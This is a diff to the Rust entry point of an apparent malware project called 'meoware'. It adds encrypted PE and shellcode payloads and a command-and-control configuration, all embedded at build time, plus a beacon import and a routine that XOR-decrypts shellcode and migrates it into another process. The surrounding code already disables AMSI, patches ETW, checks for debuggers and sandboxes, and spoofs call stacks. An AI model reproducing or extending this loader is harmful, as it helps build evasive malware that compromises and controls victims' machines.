@@ -1,12 +1,24 @@
 #![cfg_attr(not(any(debug_assertions, feature = "verbose")), no_std)]
 
+use meoware::core::net::beacon;
+use meoware::core::{amsi, anti_debug, etw, migration, nt, sandbox, spoof, ssn_table};
+use meoware::debug;
 
-fn _xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
+// Build time generated key
+include!(concat!(env!("OUT_DIR"), "/xor_key.rs"));
+
+// Encrypted payload
+const ENCRYPTED_PE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.enc"));
+const ENCRYPTED_SC: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/shellcode.enc"));
+
+// C2 Configuration
+include!(concat!(env!("OUT_DIR"), "/c2_config.rs"));
+
+// Runtime XOR decryption
+fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
     data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
 }
 
-use meoware::core::{amsi, anti_debug, etw, sandbox, spoof, ssn_table};
-use meoware::debug;
 
 fn main() {
     unsafe {
@@ -28,6 +40,11 @@ fn main() {
         amsi::patch_amsi();
         spoof::initialize_spoof_gadgets();
 
-        // Skiping the networking for now, Ill do migration first
+        let shellcode = xor_decrypt(ENCRYPTED_SC, &XOR_KEY);
+        debug!("[*] Migrating ({} bytes)", shellcode.len());
+        if migration::self_migrate(&shellcode) {
+            debug!(" [*] Done - exiting");
+            return;
+        }
     }
 }
